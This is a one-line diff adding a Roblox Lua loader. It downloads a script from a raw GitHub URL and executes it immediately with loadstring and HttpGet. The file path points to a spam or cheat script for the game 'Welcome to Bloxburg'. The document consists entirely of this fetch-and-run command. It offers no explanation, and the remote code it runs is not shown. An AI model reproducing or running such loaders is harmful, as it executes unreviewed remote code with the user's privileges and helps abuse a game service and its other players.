@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/welcome-to-bloxburg-spam3-ojyw2h8pobdrhh.lua"))()
